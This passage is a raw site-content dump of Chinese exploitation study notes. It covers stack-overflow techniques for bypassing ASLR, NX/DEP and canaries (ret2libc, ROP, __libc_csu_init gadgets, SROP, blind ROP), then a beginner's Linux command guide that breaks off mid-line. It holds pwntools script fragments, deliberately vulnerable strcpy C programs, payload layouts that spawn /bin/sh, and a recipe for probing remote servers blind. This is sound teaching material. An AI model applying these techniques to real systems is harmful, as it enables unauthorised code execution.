rop.fill(<span class=\"number\">100</span>, buf)</span><br><span class=\"line\">p.write(buf)</span><br><span class=\"line\">p.interact(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass之GOT劫持</strong></p>\n<p>当不能直接利用roputils时需要手动伪造两个数据结构、计算偏移和填充大小。</p>\n<p><strong>ASLR Bypass之ret2eax</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">msglog</span><span class=\"params\">(<span class=\"keyword\">char</span> *input)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">64</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf, input);      <span class=\"comment\">//&lt;---------返回值是一个存储在eax的指向buf的指针</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;exploitme &lt;msg&gt;\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">msglog(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>随后，调用*eax就会把程序控制流劫持到buf上</p>\n<p><strong>ASLR Bypass之ret2ret</strong></p>\n<p>如果栈上有一个函数指针需要被执行，可以考虑这个ret = pop eip；jmp eip；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">char</span> buffer[<span class=\"number\">256</span>];</span><br><span class=\"line\">   <span class=\"built_in\">strcpy</span>(buffer, str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">int</span> no = <span class=\"number\">1</span>;</span><br><span class=\"line\">   <span class=\"keyword\">int</span> *ptr = &amp;no;</span><br><span class=\"line\">   f(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass之ret2pop</strong></p>\n<p>返回到一个地址，执行的命令为pop xxx,ret，在栈上布置要返回的函数和参数。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626171343899.png\" alt=\"image-20210626171343899\" style=\"zoom:50%;\" />\n\n<h3 id=\"NX-DEP\"><a href=\"#NX-DEP\" class=\"headerlink\" title=\"NX/DEP\"></a><strong>NX/DEP</strong></h3><p>NX/DEP保护，即数据段不可执行保护，是针对栈溢出攻击而产生的一项防护措施。简单的来说，当开启这种保护时，堆栈上的指令将没有执行权限。所以，将shellcode写到栈上的简单的栈溢出攻击将会失效。</p>\n<p> <strong>DEP绕过之ret2libc</strong></p>\n<p>不利用自己注入的代码，而用系统已有的代码来构造攻击</p>\n<p>system(“/bin/sh”)</p>\n<ul>\n<li><p>特点</p>\n</li>\n<li><ul>\n<li>通常指向系统共享库的代码 —&gt;执行不受NX/DEP影响</li>\n</ul>\n</li>\n<li><p>溢出形式</p>\n<pre><code>      buffer + system()的地址 + ret + binsh_addr\n      system()的地址即系统共享库中system()的地址。\n      这里ret的值是执行玩system()后的返回地址，并不重要，可以为任意值。p64(0)\n      binsh_addr()作为system()的参数，调用后拉起shell。\n</code></pre>\n</li>\n</ul>\n<p><strong>如果有ASLR保护？</strong></p>\n<p>地址空间配置随机载入（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。（维基百科）</p>\n<p>即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。</p>\n<p><strong>影响</strong></p>\n<ul>\n<li>libc基地址变动</li>\n<li>gadgets的地址难以确认。<pre><code>      ldd 查看libc地址，发现每一次都有变动。\n</code></pre>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Documents/pwnkr/bof $ ldd bof</span><br><span class=\"line\">\tlinux-gate.so.1 =&gt;  (0xf7777000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7599000)</span><br><span class=\"line\">\t/lib/ld-linux.so.2 (0x5662b000)</span><br><span class=\"line\">~/Documents/pwnkr/bof $ ldd bof</span><br><span class=\"line\">\tlinux-gate.so.1 =&gt;  (0xf7720000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7542000)</span><br><span class=\"line\">~/Documents/pwnkr/bof $ ldd bof</span><br><span class=\"line\">\tlinux-gate.so.1 =&gt;  (0xf775d000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf757f000)</span><br><span class=\"line\">\t/lib/ld-linux.so.2 (0x565c1000)</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR应对方法</strong></p>\n<ul>\n<li><p>泄露libc地址</p>\n</li>\n<li><p>for example </p>\n</li>\n<li><ul>\n<li>用write(1,got.write(),4)打印write()函数的实际地址，通过偏移来算libc.so的基地址，进而算出system()的真实地址。</li>\n<li>libc_addr=write_addr - write_offset</li>\n<li>system_addr=libc_addr + system_offset</li>\n</ul>\n</li>\n</ul>\n<p><strong>Memory Leak &amp; DynELF</strong></p>\n<p>DynELF是pwntools提供的一个模块，可以帮助我们在没有libc文件时找到system()的地址。</p>\n<ul>\n<li>使用<pre><code>      DynELF(leak,elf=ELF(&#39;&#39;)).lookup(&#39;system&#39;,&#39;libc&#39;)\n      leak，需要自己实现的函数，在此函数中至少要泄漏一个字节的内存。\n</code></pre>\n</li>\n<li>leak()的形式</li>\n</ul>\n<p>def leak(address):<br>  …</p>\n<p> return data</p>\n<p>还有”/bin/sh”<br>需要注意的是，DynElF无法搜索到”/bin/sh”的地址，这里可以用一个read()把”/bin/sh”写到bss段上</p>\n<p><strong>DEP绕过之ROP</strong></p>\n<p>面向返回编程（Return-Oriented Programming，ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>\n<p><strong>关于gadget</strong></p>\n<p>攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列称为gadget。</p>\n<p>每一段gadget通常是结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。</p>\n<p><strong>32位栈溢出和64位的区别</strong></p>\n<ul>\n<li><p>内存地址范围从32位增加到64位</p>\n</li>\n<li><p>函数参数的传递由压栈传参变成了先由寄存器传参，依次是RDI，RSI，RDX，RCX，R8和     R9，不够用时才会通过栈来传递</p>\n</li>\n<li><p>内存地址不大于0x00007fffffffffff，否则抛出异常。</p>\n</li>\n<li><p>64位下re2libc </p>\n</li>\n<li><ul>\n<li>buffer + pop_rdi_ret + binsh_addr + system()</li>\n<li>或者buffer + pop_rax_pop_rdi_call_rax + system() + binsh_addr</li>\n</ul>\n</li>\n<li><p>主要的gadget </p>\n</li>\n<li><ul>\n<li>传参（pop xxx,ret）</li>\n<li>系统调用函数（system()，exec()）</li>\n</ul>\n</li>\n</ul>\n<p><strong>ROPgadeget</strong></p>\n<p>$ ROPgadget –binary –only “pop|ret”</p>\n<p>~/Documents/pwnkr/bof $ ROPgadget –binary bof –only “pop|ret”</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000005ee : pop ebp ; ret</span><br><span class=\"line\">0x00000624 : pop ebx ; pop ebp ; ret</span><br><span class=\"line\">0x000005ec : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0000070c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x000004a0 : pop ebx ; ret</span><br><span class=\"line\">0x0000070e : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x000005ed : pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0000070d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0000047f : ret</span><br><span class=\"line\">Unique gadgets found: 9</span><br></pre></td></tr></table></figure>\n\n<p>程序比较小时，gadget的数量也不多，也可以考虑搜索libc.so中的gadget，可用的很多。</p>\n<p><strong>Libc上的Gadget</strong></p>\n<p>能够泄漏libc基地址时，使用libc的gadget更加方便和容易，libc上可用的gadget就很丰富了。</p>\n<p>$ ROPgadget –binary /lib/i386-linux-gnu/libc.so.6 –only “pop|ret”<br> …<br> Unique gadgets found: 1226</p>\n<p><strong>ret2__libc_csu_init</strong></p>\n<p>libc_csu_init()用于对libc进行初始化操作的函数，只要使用了libc函数就一定会有此函数出现，而绝大多数的程序都会调用libc的函数，即__libc_csu_init()广泛存在于linux程序中。</p>\n<p>__libc_csu_init()中的gadget也可以作为通用gadget。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</span><br><span class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>最后连续的6个pop，可以用栈溢出控制rbx，rbp，r12，r13，r14，r15</li>\n<li>之后从400600开始可以控制到rdi（通过edi），rsi，rdx的值，并call[r12+rbx*8]。<br>通过上面的调用可以控制到三个传递参数的寄存器，并且执行一次call，完成ret2libc。</li>\n</ul>\n<p><strong>JOP</strong></p>\n<p>$ ROPgadget –binary BIN –only “pop|jmp”</p>\n<p>以jmp结束的一系列指令，原理与普通ROP类似。</p>\n<p><strong>SROP</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173337625.png\" alt=\"image-20210626173337625\" style=\"zoom:50%;\" />\n\n<p>signal机制是一套被广泛应用于unix的机制，它通常用于系统在用户态和内核态切换，执行如杀死进程，设置进程定时器等功能。</p>\n<p>如图所示，内核向进程发起signal。进程挂起，进入内核（1），内核为进程保存上下文，跳到signal handler，之后又返回内核态，上下文恢复，最后返回最初的进程。</p>\n<p>重点在第二步和第三步上，我们可以把signal handler理解为一个特殊的函数，这个函数返回地址是rt_sigreturn，在执行完signal handler，会返回到rt_sigretrun，而rt_sigreturn会将上下文参数恢复。下图是linux系统保存在栈上的上下文信息。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173459882.png\" alt=\"image-20210626173459882\" style=\"zoom:70%;\" />\n\n<p>可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173550488.png\" alt=\"image-20210626173550488\" style=\"zoom:67%;\" />\n\n<p><strong>system call chains</strong></p>\n<p>那么此时当rt_sigreturn 执行完毕后，随后就会执行rip指向的syscall()，并且以rax和rdi为参数。明显的，这个函数调用会弹出一个shell，攻击完成。</p>\n<p>如果栈上存放的rip指向的地址不仅仅是syscall()而是syscall(),ret的gadget，并且控制栈指针指向另一个Fake Signal Frame，可以生成一系列的signal调用。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174128518.png\" alt=\"image-20210626174128518\" style=\"zoom:50%;\" />\n\n<p>可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174307723.png\" alt=\"image-20210626174307723\" style=\"zoom:50%;\" />\n\n<p><strong>BROP (blind rop)</strong></p>\n<p>BROP与其说是rop技巧，更不如说是寻找gadget的技巧，它的特长在于，可以在没有源程序的情况下寻找有效的gadget，是一种适用于远程攻击的rop，针对的是64位系统。</p>\n<ul>\n<li>攻击条件<br>在前面我们提到了aslr保护，也就是地址随机化保护，在远程服务器中，服务器端的程序进程崩溃之后会自动重新启动。而对于大部分服务器应用来说，崩溃后重启的地址与崩溃前一样，也就是说虽然服务器端开启了额aslr保护，但只会在第一次启动时生效，崩溃后的重启并不会再次启用aslr随机化。当我们遇到这种远程程序的时候，可以反复进行崩溃尝试而不必担心aslr的影响。</li>\n</ul>\n<p><strong>stack reading</strong></p>\n<p>用于绕过canary保护</p>\n<p>canary（金丝雀）</p>\n<p>过去由于缺少气体环境的检测工具，煤矿工人会带着金丝雀下矿洞，金丝雀对于周围气体非常敏感，如果金丝雀死亡，则说明有大量的危险气体，这时矿工就会撤离。</p>\n<p>在现代操作系统中，canary是一种防止栈溢出的保护机制，在开辟函数栈时，会先在fs块内存中的某个地方读取值并存到栈上，当函数运行到返回之前，会先检查当前栈上的数据与一开始从fs块上读取的值是否相同（通常是一个异或比较），若不同，则认为程序被栈溢出攻击，直接崩溃。狭义的来说，栈上一开始保存的数据，被我们称为canary。需要注意的是，canary的最低一位一般为“/x00”，这是为了防止canary被一些可以打印栈上数据的漏洞泄露。</p>\n<ul>\n<li>必要条件,崩溃后的重启不会改变canary的值。</li>\n<li>开启canary保护时栈上的布局,Buffer|canary|pre ebp|ret</li>\n</ul>\n<p><strong>覆盖canary</strong></p>\n<p>32位系统下canary长度一般为4个字节，64位下则是8个字节。</p>\n<p>进行爆破尝试时，如果仅仅是枚举所有可能的数值，则最多需要尝试4294967296（FFFF+1）次，无疑时非常低效的。</p>\n<ul>\n<li>改进<br>为了提升效率，我们可以采用逐字节爆破的方式，具体见图。对于逐字节爆破，最大尝试次数仅为4*256=1024</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174745466.png\" alt=\"image-20210626174745466\" style=\"zoom:80%;\" />\n\n<p><strong>blind</strong></p>\n<p>这里的blind是指没有本地二进制文件或者源码的情况，即只有位于远程服务器端程序。</p>\n<p>不同于本地二进制文件或源码，我们可以直接扫描本地内存获取gadget，远程服务器端的程序，我们很难找到有效的gadget。此时我们可以换个思路，先远程dump内存，利用write（）或者puts（）这类的输出函数来实现。</p>\n<p><strong>寻找起write()和puts()参数的gadgets</strong></p>\n<p>这类gadgets一般形式是pop xxx,ret</p>\n<ul>\n<li>trap地址<pre><code>      当程序执行到这个地址时，程序会崩溃。这种地址很常见，内存中到处都是这类地址，一个随机跳转的地址总是能引起程序崩溃。\n</code></pre>\n</li>\n<li>stop地址<pre><code>      区别于trap地址，当程序执行到这个地址时，程序会被挂起或者无限循环。\n</code></pre>\n</li>\n</ul>\n<p><strong>brop gadget</strong></p>\n<p>在libc_csu_init的结尾一段这样的指令</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626175012882.png\" alt=\"image-20210626175012882\" style=\"zoom:80%;\" />\n\n<p>可以看到，这段指令的特殊之处在于它是连续6个pop接一个ret。这种结构非常少见，意即我们可以通过寻找这种结构的gadget来找到这段指令。由上图可以看到的是，这段brop gadget虽然只是对rbx，rbx，r12，r13，r14，r15进行pop然后ret，但是通过分析其机器码，若程序从偏移0x7开始执行，指令则变为pop rsi，pop r15，ret。若程序从偏移0x9开始执行，指令则变为pop rdi，ret。所以若找到这段brop gadget，我们便可以通过偏移找到起第一个和第二个函数参数的gadget。</p>\n<p><strong>寻找brop gadget的地址</strong></p>\n<p>下面讲如何用trap地址和stop地址试探brop gadget的地址。我们把payload进行如下构造buffer+canary+rbp+ret+trap*6+stop+trap*n。其中，buffer和rbp的值随意填，ret的值从0x400000开始枚举，一般情况下，由于我们是枚举地址，程序会崩溃。当程序并没有崩溃而是挂起，即无限循环时，记下此时的ret的值。枚举结束后，得到若干ret的值，这里需要注意，得到的ret值有可能不是brop gadget的地址而刚好是另一个stop地址。</p>\n<p>如果是stop地址，把ret后所有地址都设为trap地址，若仍然会导致程序挂起，则确认是stop地址。</p>\n<p><strong>第三个参数的gadget</strong></p>\n<ul>\n<li>对于puts()，此时的gadgets其实已经足够，但是对于write(),仍然需要一个起参数的gadget。</li>\n<li>pop rdx,ret难以寻找，用strcmp()代替。<br>strcmp()可以对rdx进行赋值。</li>\n<li>最后用puts()或者write()dump内存，寻找更多的gadgets来完成攻击。</li>\n</ul>\n"},{"_content":"# Linux快速入门\n\n## 常用基础命令\n\n```\nls                  用来显示目标列表\n\ncd [path]           用来切换工作目录\n\npwd                 以绝对路径的方式显示用户当前工作目录\n\nman [command]       查看Linux中的指令帮助、配置文件帮助和编程帮助等信息\n\napropos [whatever]  在一些特定的包含系统命令的简短描述的数据库文件里查找关键字\n\necho [string]       打印一行文本，参数“-e”可激活转义字符\n\ncat [file]          连接文件并打印到标准输出设备上\n\nless [file]         允许用户向前或向后浏览文字档案的内容\n\nmv [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中\n\ncp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录\n\nrm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉\n\nps                  用于报告当前系统的进程状态\n\ntop                 实时查看系统的整体运行情况\n\nkill                杀死一个进程\n\nifconfig            查看或设置网络设备\n\nping                查看网络上的主机是否工作\n\nnetstat             显示网络连接、路由表和网络接口信息\n\nnc(netcat)          建立 TCP 和 UDP 连接并监听\n\nsu                  切换当前用户身份到其他用户身份\n\ntouch [file]        创建新的空文件\n\nmkdir [dir]         创建目录\n\nchmod               变更文件或目录的权限\n\nchown               变更某个文件或目录的所有者和所属组\n\nnano / vim / emacs  字符终端的文本编辑器\n\nexit                退出 shell\n管道命令符 \"|\"       将一个命令的标准输出作为另一个命令的标准输入\n```\n\n使用变量：\n\n```\nvar=value         给变量var赋值value\n\n$var, ${var}      取变量的值\n\n`cmd`, $(cmd)     代换标准输出\n\n'string'          非替换字符串\n\n\"string\"          可替换字符串        \n$ var=\"test\";\n$ echo $var\ntest\n$ echo 'This is a $var';\nThis is a $var\n$ echo \"This is a $var\";\nThis is a test\n\n$ echo `date`;\n2017年 11月 06日 星期一 14:40:07 CST\n$ $(bash)\n\n$ echo $0\n/bin/bash\n$ $($0)\n```\n\n\n\n## Bash 快捷键\n\n```\nUp(Down)          上（下）一条指令\n\nCtrl + c          终止当前进程\n\nCtrl + z          挂起当前进程，使用“fg”可唤醒\n\nCtrl + d          删除光标处的字符\n\nCtrl + l          清屏\n\nCtrl + a          移动到命令行首\n\nCtrl + e          移动到命令行尾\n\nCtrl + b          按单词后移（向左）\n\nCtrl + f          按单词前移（向右）\n\nCtrl + Shift + c  复制\n\nCtrl + Shift + v  粘贴\n```\n\n## 根目录结构\n\n\n\n```\n$ uname -a\nLinux manjaro 4.11.5-1-ARCH #1 SMP PREEMPT Wed Jun 14 16:19:27 CEST 2017 x86_64 GNU/Linux\n$ ls -al /\ndrwxr-xr-x  17 root root  4096 Jun 28 20:17 .\ndrwxr-xr-x  17 root root  4096 Jun 28 20:17 ..\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Aug 10 22:50 boot\ndrwxr-xr-x  20 root root  3140 Aug 11 11:43 dev\ndrwxr-xr-x 101 root root  4096 Aug 14 13:54 etc\ndrwxr-xr-x   3 root root  4096 Apr  8 19:59 home\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 lib -> usr/lib\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 lib64 -> usr/lib\ndrwx------   2 root root 16384 Apr  8 19:55 lost+found\ndrwxr-xr-x   2 root root  4096 Oct  1  2015 mnt\ndrwxr-xr-x  15 root root  4096 Jul 15 20:10 opt\ndr-xr-xr-x 267 root root     0 Aug  3 09:41 proc\ndrwxr-x---   9 root root  4096 Jul 22 22:59 root\ndrwxr-xr-x  26 root root   660 Aug 14 21:08 run\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 sbin -> usr/bin\ndrwxr-xr-x   4 root root  4096 May 28 22:07 srv\ndr-xr-xr-x  13 root root     0 Aug  3 09:41 sys\ndrwxrwxrwt  36 root root  1060 Aug 14 21:27 tmp\ndrwxr-xr-x  11 root root  4096 Aug 14 13:54 usr\ndrwxr-xr-x  12 root root  4096 Jun 28 20:17 var\n```\n\n由于不同的发行版会有略微的不同，我们这里使用的是基于 Arch 的发行版 Manjaro，以上就是根目录下的内容，我们介绍几个重要的目录： - `/bin`、`/sbin`：链接到 `/usr/bin`，存放 Linux 一些核心的二进制文件，其包含的命令可在 shell 上运行。 - `/boot`：操作系统启动时要用到的程序。 - `/dev`：包含了所有 Linux 系统中使用的外部设备。需要注意的是这里并不是存放外部设备的驱动程序，而是一个访问这些设备的端口。 - `/etc`：存放系统管理时要用到的各种配置文件和子目录。 - `/etc/rc.d`：存放 Linux 启动和关闭时要用到的脚本。 - `/home`：普通用户的主目录。 - `/lib`、`/lib64`：链接到 `/usr/lib`，存放系统及软件需要的动态链接共享库。 - `/mnt`：这个目录让用户可以临时挂载其他的文件系统。 - `/proc`：虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。 - `/root`：系统管理员的主目录。 - `/srv`：存放一些服务启动之后需要提取的数据。 - `/sys`：该目录下安装了一个文件系统 sysfs。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建时，对应的文件和目录也在内核对象子系统中被创建。 - `/tmp`：公用的临时文件存放目录。 - `/usr`：应用程序和文件几乎都在这个目录下。 - `/usr/src`：内核源代码的存放目录。 - `/var`：存放了很多服务的日志信息。\n\n\n\n## 进程管理\n\n- top\n- 可以实时动态地查看系统的整体运行情况。\n- ps\n- 用于报告当前系统的进程状态。可以搭配 kill 指令随时中断、删除不必要的程序。\n- 查看某进程的状态：`$ ps -aux | grep [file]`，其中返回内容最左边的数字为进程号（PID）。\n- kill\n- 用来删除执行中的程序或工作。\n- 删除进程某 PID 指定的进程：`$ kill [PID]`\n\n## UID 和 GID\n\nLinux 是一个支持多用户的操作系统，每个用户都有 User ID(UID) 和 Group ID(GID)，UID  是对一个用户的单一身份标识，而 GID 则对应多个 UID。知道某个用户的 UID 和 GID 是非常有用的，一些程序可能就需要 UID/GID 来运行。可以使用 `id` 命令来查看：\n\n```\n$ id root\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)\n$ id firmy\nuid=1000(firmy) gid=1000(firmy) groups=1000(firmy),3(sys),7(lp),10(wheel),90(network),91(video),93(optical),95(storage),96(scanner),98(power),56(bumblebee)\n```\n\nUID 为 0 的 root 用户类似于系统管理员，它具有系统的完全访问权。我自己新建的用户 firmy，其 UID 为 1000，是一个普通用户。GID 的关系存储在 `/etc/group` 文件中：\n\n```\n$ cat 